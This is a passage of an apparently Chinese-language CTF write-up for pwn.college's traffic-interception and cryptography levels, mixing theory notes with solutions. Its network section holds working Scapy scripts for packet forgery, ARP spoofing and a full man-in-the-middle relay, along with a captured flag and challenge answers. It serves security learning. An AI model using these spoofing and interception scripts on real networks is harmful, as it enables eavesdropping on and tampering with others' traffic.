1500</span><br><span class="line">        inet 10.0.0.2  netmask 255.255.0.0  broadcast 0.0.0.0</span><br><span class="line">        inet6 fe80::60f7:ff:fe14:fbea  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 62:f7:00:14:fb:ea  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 43  bytes 3498 (3.4 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 20  bytes 1668 (1.6 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536    # 用于本地通信</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></tbody></table></figure><p>发现<code>eth0</code>接口，然后使用<code>tcpdump -A -i eth0 port 31337</code> 得到flag</p></li><li><p>level6：监控远程主机的慢速流量（其实就是一个一个字符发送）</p><p>wp：如果直接用<code>tcpdump -A -i eth0 port 31337</code>，会显示一大堆没用的信息，不过可以得知是<code>10.0.0.3</code>向本机发送数据，可以使用命令<code>tcpdump -A -i eth0 src host 10.0.0.3 and dst host 10.0.0.2</code>，发现每次发送一个字符，所以可以用下面的脚本提取字符串：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag=<span class="string">''</span></span><br><span class="line">    buffer = []</span><br><span class="line">    recording = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> sys.stdin:</span><br><span class="line">        line = line.rstrip()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 当检测到包含 "length 1" 的行时</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'length 1'</span> <span class="keyword">in</span> line:</span><br><span class="line">            recording = <span class="literal">True</span></span><br><span class="line">            buffer = []</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'length 0'</span> <span class="keyword">in</span> line:</span><br><span class="line">            recording = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> recording:</span><br><span class="line">            buffer.append(line)</span><br><span class="line">            <span class="comment"># 记录的行数达到 4 行时</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(buffer) == <span class="number">4</span>:</span><br><span class="line">                <span class="comment"># 输出最后一行的最后一个字符</span></span><br><span class="line">                last_line = buffer[-<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">if</span> last_line:</span><br><span class="line">                    last_char = last_line[-<span class="number">1</span>]</span><br><span class="line">                    flag+=last_char</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f"Last character extracted: <span class="subst">{flag}</span>"</span>)</span><br><span class="line">                <span class="comment"># 重置记录状态</span></span><br><span class="line">                recording = <span class="literal">False</span></span><br><span class="line">                buffer = []</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p>然后将tcpdump回显传给该脚本，得到flag（可能要多运行几次才能得到完整正确的flag）</p><p><code>tcpdump -A -i eth0 src host 10.0.0.3 and dst host 10.0.0.2 | python getflag.py</code></p><p>pwn.college{cTd7x9tiz-q-32migfK6GPucpAX.dRjNzMDLycDMyUzW}</p></li><li><p>level7：通过配置网络接口拦截远程主机的流量</p><p>wp：这题一开始没什么思路，然后突然想到ARP协议，准备使用ARP欺骗，但是相关工具用不了，于是先使用<code>tcpdump -i eth0</code>查看本机的流量情况：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode</span><br><span class="line">listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">08:50:00.376706 ARP, Request who-has 10.0.0.2 tell 10.0.0.4, length 28</span><br><span class="line">08:50:01.377721 ARP, Request who-has 10.0.0.2 tell 10.0.0.4, length 28</span><br><span class="line">08:50:02.379126 ARP, Request who-has 10.0.0.2 tell 10.0.0.4, length 28</span><br></pre></td></tr></tbody></table></figure><p>发现本机一直能够接收到10.0.0.4发送的ARP信息，然后就需要把我们的主机伪装成10.0.0.2，但是我不会怎么操作<span class="github-emoji"><span>😓</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f613.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>，参考<a href="https://tephrocactusmyc.github.io/CTF-CLASS/CSE365/Intercepting-Communication.html">大佬的wp</a>，得知<code>ip</code>命令（用于配置和查看Linux网络设备和接口的工具），通过<code>ip addr add 10.0.0.2/24 dev eth0</code>为网络接口添加IP地址，然后监测流量：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-0-3:~# tcpdump -i eth0</span><br><span class="line">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode</span><br><span class="line">listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">08:53:25.649323 ARP, Request who-has 10.0.0.2 tell 10.0.0.4, length 28</span><br><span class="line">08:53:25.649344 ARP, Reply 10.0.0.2 is-at fe:b4:c0:4c:6b:f3 (oui Unknown), length 28</span><br><span class="line">08:53:25.649377 IP 10.0.0.4.40878 &gt; 10.0.0.2.31337: Flags [S], seq 2328130165, win 64240, options [mss 1460,sackOK,TS val 4097716417 ecr 0,nop,wscale 7], length 0</span><br></pre></td></tr></tbody></table></figure><p>发现成功挟持流量，然后使用<code>nc -l 31337</code>查看flag</p></li><li><p>level8：手动发送以太帧</p><blockquote><p>Scapy是一个强大的Python库，用于网络数据包的生成、操作、嗅探和伪造。它支持大量的网络协议，包括以太网、IP、TCP、UDP等，使用户可以轻松地构建、发送和接收数据包</p><p>示例：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> Ether, sendp</span><br><span class="line"></span><br><span class="line">packet = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, src=<span class="string">"01:02:03:04:05:06"</span>, <span class="built_in">type</span>=<span class="number">0x0800</span>)</span><br><span class="line">sendp(packet, iface=<span class="string">"eth0"</span>)</span><br></pre></td></tr></tbody></table></figure></blockquote><p>wp：首先通过<code>ip addr show</code>查看本机MAC地址，然后通过上面的Python库编写脚本发送数据包（广播）</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">packet = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, src=<span class="string">"de:33:4e:45:7f:2e"</span>, <span class="built_in">type</span>=<span class="number">0xFFFF</span>)</span><br><span class="line">sendp(packet, iface=<span class="string">"eth0"</span>)</span><br></pre></td></tr></tbody></table></figure></li><li><p>level9：手动发送IP分组，下面是scapy库使用示例</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> IP, send</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建一个IP数据包</span></span><br><span class="line">packet = IP(</span><br><span class="line">    dst=<span class="string">"8.8.8.8"</span>,           <span class="comment"># 目标IP地址</span></span><br><span class="line">    src=<span class="string">"10.0.0.1"</span>,          <span class="comment"># 源IP地址</span></span><br><span class="line">    ttl=<span class="number">128</span>,                 <span class="comment"># TTL值</span></span><br><span class="line">    <span class="built_in">id</span>=<span class="number">12345</span>,                <span class="comment"># 数据包标识符</span></span><br><span class="line">    flags=<span class="string">"DF"</span>,              <span class="comment"># Don't Fragment标志</span></span><br><span class="line">    tos=<span class="number">0x10</span>,                <span class="comment"># 服务类型</span></span><br><span class="line">    proto=<span class="number">1</span>                  <span class="comment"># ICMP协议</span></span><br><span class="line">) / <span class="string">"Hello, World!"</span>          <span class="comment"># 数据负载</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送数据包</span></span><br><span class="line">send(packet)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>wp：直接根据上述代码构造IP分组，未知的参数就省略，但是运行结果报错<code>WARNING: No route found (no default route?)</code>，找不到有效路由，还是得通过数据链路层发送</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> Ether, IP, sendp</span><br><span class="line"><span class="comment"># 数据包的构造： Ether / IP / data</span></span><br><span class="line">packet = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, src=<span class="string">"be:08:7d:7b:c4:96"</span>, <span class="built_in">type</span>=<span class="number">0x0800</span>) / IP(dst=<span class="string">"10.0.0.3"</span>, src=<span class="string">"10.0.0.2"</span>, proto=<span class="number">0xFF</span>)</span><br><span class="line">sendp(packet, iface=<span class="string">"eth0"</span>)</span><br></pre></td></tr></tbody></table></figure></li><li><p>level10：手动发送TCP报文段</p><p>wp：思路同上</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> Ether, IP, TCP, sendp</span><br><span class="line"></span><br><span class="line">packet = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, src=<span class="string">"4a:b6:df:8e:bd:97"</span>, <span class="built_in">type</span>=<span class="number">0x0800</span>) / IP(dst=<span class="string">"10.0.0.3"</span>, src=<span class="string">"10.0.0.2"</span>, proto=<span class="number">0x6</span>) / TCP(sport=<span class="number">31337</span>, dport=<span class="number">31337</span>, seq=<span class="number">31337</span>, ack=<span class="number">31337</span>, flags=<span class="string">"APRSF"</span>)</span><br><span class="line">sendp(packet, iface=<span class="string">"eth0"</span>)</span><br></pre></td></tr></tbody></table></figure></li><li><p>level11：手动模拟TCP三次握手</p><p>wp：这里用到 tmux分屏查看流量细节。左右分屏后在左边终端运行<code>tcpdump -i eth0</code>监测流量，然后在右边终端中运行下面的脚本</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> Ether, IP, TCP, sendp</span><br><span class="line"></span><br><span class="line">packet1 = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, src=<span class="string">"9e:21:1d:a7:07:e7"</span>, <span class="built_in">type</span>=<span class="number">0x0800</span>) / IP(dst=<span class="string">"10.0.0.3"</span>, src=<span class="string">"10.0.0.2"</span>, proto=<span class="number">0x6</span>) / TCP(sport=<span class="number">31337</span>, dport=<span class="number">31337</span>, seq=<span class="number">31337</span>, flags=<span class="string">"S"</span>)</span><br><span class="line">sendp(packet1, iface=<span class="string">"eth0"</span>)</span><br></pre></td></tr></tbody></table></figure><p>此时左边终端出现TCP流量：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes             14:13:39.439207 IP 10.0.0.2.31337 &gt; 10.0.0.3.31337: Flags [S], seq 31337, win 8192, length 0                                                                             14:13:39.478926 IP 10.0.0.3.31337 &gt; 10.0.0.2.31337: Flags [S.], seq 558135948, ack 31338, win 8192, length 0 </span><br></pre></td></tr></tbody></table></figure><p>得到第三次TCP握手需要发送的<code>ack</code>的值<code>558135948+1</code>，然后运行下一个脚本，得到flag</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> Ether, IP, TCP, sendp</span><br><span class="line"></span><br><span class="line">packet2 = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, src=<span class="string">"9e:21:1d:a7:07:e7"</span>, <span class="built_in">type</span>=<span class="number">0x0800</span>) / IP(dst=<span class="string">"10.0.0.3"</span>, src=<span class="string">"10.0.0.2"</span>, proto=<span class="number">0x6</span>) / TCP(sport=<span class="number">31337</span>, dport=<span class="number">31337</span>, seq=<span class="number">31338</span>, ack=<span class="number">558135949</span>, flags=<span class="string">"A"</span>)</span><br><span class="line">sendp(packet2, iface=<span class="string">"eth0"</span>)</span><br></pre></td></tr></tbody></table></figure></li><li><p>level12：手动发送ARP数据包</p><p>wp：思路同上</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arp_packet = Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, src=<span class="string">"9e:4a:21:ea:20:33"</span>) / ARP(</span><br><span class="line">    pdst=<span class="string">"10.0.0.3"</span>,</span><br><span class="line">    hwdst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>,  <span class="comment"># 广播或目标主机的 MAC 地址</span></span><br><span class="line">    psrc=<span class="string">"10.0.0.2"</span>,</span><br><span class="line">    hwsrc=<span class="string">"9e:4a:21:ea:20:33"</span>,</span><br><span class="line">    op=<span class="string">"is-at"</span></span><br><span class="line">)</span><br><span class="line">sendp(arp_packet, iface=<span class="string">"eth0"</span>)</span><br></pre></td></tr></tbody></table></figure></li><li><p>level13：使用ARP挟持远程主机的流量</p><p>wp：利用scapy库实现</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arp_spoof = ARP(</span><br><span class="line">    pdst=<span class="string">"10.0.0.4"</span>,       <span class="comment"># 目标主机的 IP 地址</span></span><br><span class="line">    hwdst=<span class="string">"1A:25:92:8C:AD:4C"</span>,  <span class="comment"># 广播或目标主机的 MAC 地址</span></span><br><span class="line">    psrc=<span class="string">"10.0.0.2"</span>,        <span class="comment"># 欺骗的 IP 地址（假装这是你的 IP）</span></span><br><span class="line">    hwsrc=<span class="string">"aa:12:c3:a5:1b:9c"</span>,  <span class="comment"># 欺骗的 MAC 地址（用你的 MAC 地址）</span></span><br><span class="line">    op=<span class="string">"is-at"</span>                    <span class="comment"># 操作码 2 表示 ARP 回复</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 ARP 欺骗包</span></span><br><span class="line">send(arp_spoof)</span><br></pre></td></tr></tbody></table></figure><p>注意源IP地址是你需要利用的地址而不是你自己的IP地址，然后查看流量获取flag</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -A -i eth0</span><br></pre></td></tr></tbody></table></figure></li><li><p>level14：中间人攻击</p><p>wp：这里需要编写脚本进行ARP欺骗，让10.0.0.4主机认为我是10.0.0.3，让10.0.0.3认为我是10.0.0.4，从而实现拦截流量的目的。下面这段代码可以实现对应功能（用chatGPT生成的）</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> scapy.layers.http <span class="keyword">import</span> HTTPRequest, HTTPResponse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置要攻击的 IP 地址</span></span><br><span class="line">target_ip1 = <span class="string">"10.0.0.4"</span></span><br><span class="line">target_ip2 = <span class="string">"10.0.0.2"</span></span><br><span class="line">iface = <span class="string">"eth0"</span>  <span class="comment"># 网络接口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于 ARP 欺骗的目标 MAC 地址</span></span><br><span class="line">target_mac1 = <span class="string">"xx:xx:xx:xx:xx:xx"</span></span><br><span class="line">target_mac2 = <span class="string">"yy:yy:yy:yy:yy:yy"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arp_spoof</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        send(ARP(op=<span class="number">2</span>, pdst=target_ip1, hwdst=target_mac1, psrc=target_ip2), iface=iface)</span><br><span class="line">        send(ARP(op=<span class="number">2</span>, pdst=target_ip2, hwdst=target_mac2, psrc=target_ip1), iface=iface)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">packet_callback</span>(<span class="params">packet</span>):</span><br><span class="line">    <span class="keyword">if</span> packet.haslayer(HTTPRequest):</span><br><span class="line">        <span class="keyword">if</span> packet[HTTPRequest].Method == <span class="string">b"GET"</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"Intercepted GET request to <span class="subst">{packet[HTTPRequest].Host}</span><span class="subst">{packet[HTTPRequest].Path}</span>"</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 这里可以添加额外的流量或修改数据包</span></span><br><span class="line">            packet[IP].src = target_ip2</span><br><span class="line">            send(packet, iface=iface)</span><br><span class="line">    <span class="keyword">elif</span> packet.haslayer(HTTPResponse):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"Intercepted HTTP response from <span class="subst">{packet[IP].src}</span>"</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 可以在这里修改响应内容</span></span><br><span class="line">        packet[IP].dst = target_ip1</span><br><span class="line">        send(packet, iface=iface)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># 启动 ARP 欺骗线程</span></span><br><span class="line">    <span class="keyword">import</span> threading</span><br><span class="line">    arp_thread = threading.Thread(target=arp_spoof)</span><br><span class="line">    arp_thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始嗅探和修改流量</span></span><br><span class="line">    sniff(iface=iface, prn=packet_callback, store=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>运行完该脚本后，通过<code>tcpdump -A -i eth0</code>监听流量，发现：10.0.0.3首先发送<em>SECRET</em>，然后10.0.0.4回复一串ASCii码，接着10.0.0.3发送<em>COMMANDS::，接着10.0.0.4回复</em>ECHO<em>，然后10.0.0.3发送</em>Helloworld！<em>。由此得出，若10.0.0.4发送包含</em>FLAG*的数据包，则会返回flag。但是脚本不会写，参考<a href="https://tephrocactusmyc.github.io/CTF-CLASS/CSE365/Intercepting-Communication.html">大佬的wp</a>。</p></li></ul><h2 id="cryptography">Cryptography</h2><h3 id="知识点-5">知识点</h3><h4 id="symmetric-encryption对称加密">SymmetricEncryption（对称加密）</h4><ul><li><p>One-TimePad：https://zh.wikipedia.org/wiki/%E4%B8%80%E6%AC%A1%E6%80%A7%E5%AF%86%E7%A2%BC%E6%9C%AC</p></li><li><p>AES：详见 https://ctf-wiki.org/crypto/blockcipher/aes/</p><p>Key Size：128/192/256 bits</p><p>Block Size：128 bits（不够则需要补位，pck7标准）</p></li><li><p>ECB模式：分块</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240802105701266.png" alt="image-20240802105701266"><figcaption aria-hidden="true">image-20240802105701266</figcaption></figure></li><li><p>CBC：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240802105617577.png" alt="image-20240802105617577"><figcaption aria-hidden="true">image-20240802105617577</figcaption></figure></li><li><p>CTR：计数每次加1</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240802111654091.png" alt="image-20240802111654091"><figcaption aria-hidden="true">image-20240802111654091</figcaption></figure></li><li><p>Key Exchange：交换密钥</p><p>满足交换律的运算：加法，乘法，Paint Mixing</p><p>原根（Primitiveroot）：https://zh.wikipedia.org/wiki/%E5%8E%9F%E6%A0%B9</p><p>Diffie–Hellman key exchange</p></li></ul><h4 id="key-exchange交换密钥">Key Exchange：交换密钥</h4><ul><li><p>满足交换律的运算：加法，乘法，Paint Mixing</p></li><li><p>原根（Primitiveroot）：https://zh.wikipedia.org/wiki/%E5%8E%9F%E6%A0%B9</p></li><li><p><a href="https://thiscute.world/posts/practical-cryptography-basics-5-key-exchange/">Diffie–Hellmankey exchange</a>（D-H）：密钥交换</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240803104543316.png" alt="image-20240803104543316"><figcaption aria-hidden="true">image-20240803104543316</figcaption></figure></li></ul><h4 id="asymmetric-encryption非对称加密">AsymmetricEncryption（非对称加密）</h4><ul><li><p>公钥和私钥：公钥用于加密，私钥用于解密</p></li><li><p>Fermat's littletheorem（费马小定理）：https://zh.wikipedia.org/wiki/%E8%B4%B9%E9%A9%AC%E5%B0%8F%E5%AE%9A%E7%90%86</p></li><li><p>Euler'sTheorem（欧拉定理）：https://zh.wikipedia.org/wiki/%E6%AC%A7%E6%8B%89%E5%AE%9A%E7%90%86_(%E6%95%B0%E8%AE%BA)</p></li><li><p>RSA：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240803153341591.png" alt="image-20240803153341591"><figcaption aria-hidden="true">image-20240803153341591</figcaption></figure></li></ul><h4 id="hashing">Hashing</h4><ul><li>散列函数（哈希函数）：结果一般为固定长度字符串</li><li>hash withsalt：https://zh.wikipedia.org/wiki/%E7%9B%90_(%E5%AF%86%E7%A0%81%E5%AD%A6)</li></ul><h3 id="练习-5">练习</h3><ul><li><p>level1：base64解码</p><p>wp：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(<span class="string">""</span>))</span><br></pre></td></tr></tbody></table></figure></li><li><p>level2：一次性密码本</p><p>wp：题目给出base64编码状态下的密钥和密文，我一开始直接将两个base64字符串进行异或发现行不通，于是尝试先解码再异或，得到flag</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">import</span> base64</span><br><span class="line">key = <span class="string">"lzygDwIWT8kdWoKrgRvtrAbQ7cBuDUDDNSvX0Gu0GnacUUJ3H1Hd90MqbU8pT680nI/TcdT6vzctZw=="</span></span><br><span class="line">b = <span class="string">"50vOIWF5I6V4PefQyHeV3V+63rU0ZhOgUESZ6Tr4byHkF28DdQSa2Sd4FwFTAut45eyXPK2vxWBQbQ=="</span></span><br><span class="line">key = base64.b64decode(key)</span><br><span class="line">b = base64.b64decode(b)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">    c += <span class="built_in">chr</span>(b[i]^key[i])</span><br></pre></td></tr></tbody></table></figure></li><li><p>level3：一次性密码本，密钥可重复使用</p><p>wp：密文（secretciphertext）已给出，根据题目给出的提示，要求输入明文，然后输出密文。于是我尝试将给定的密文当作明文输入然后得到新的密文，如下：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">secret ciphertext (b64): y1GAvqAJ5TANUn2ZarGZGXRD3I26DTAfcDtoAV1QKHBXV8jC3FJyeoj96p09m94T7LCkIPGw78X4JQ==</span><br><span class="line">plaintext (b64): y1GAvqAJ5TANUn2ZarGZGXRD3I26DTAfcDtoAV1QKHBXV8jC3FJyeoj96p09m94T7LCkIPGw78X4JQ==</span><br><span class="line">ciphertext (b64): cHduLmNvbGxlZ2V7MHJrRHliUFJSOTRBNC1Pc3NRM1JMLWc5Z2JmLmRWek56TURMeWNETXlVeld9Cg==</span><br></pre></td></tr></tbody></table></figure><p>这里的逻辑应该是：</p><figure class="highlight markdown"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> flag ^ key = secret ciphertext </span><br><span class="line"></span><br><span class="line"><span class="bullet">2.</span> secret ciphertext  ^ key = ciphertext</span><br><span class="line"></span><br><span class="line">由上述两个式子得到：</span><br><span class="line">flag ^ key ^ key = ciphertext   --&gt;   flag = ciphertext</span><br></pre></td></tr></tbody></table></figure><p>因此只需要解码<code>cHduLmNvbGxlZ2V7MHJrRHliUFJSOTRBNC1Pc3NRM1JMLWc5Z2JmLmRWek56TURMeWNETXlVeld9Cg==</code>即可得到flag。</p></li><li><p>level4：用ECB模式解码AES密文</p><p>wp：这里使用到了新的第三方库<code>pycryptodome</code>，可以直接调用相关函数进行解码</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">a = base64.b64decode(<span class="string">"vOQZoG8aprySJx290+gqTQ=="</span>)</span><br><span class="line">b = base64.b64decode(<span class="string">"SFD4LBev3isNX+sOSP16YkvC4j/tESguw9+M+ZIoovxMNjxZCaPzy51L1Speg0YJyM56R5/BUUHe/x+mKWJZtg=="</span>)</span><br><span class="line"></span><br><span 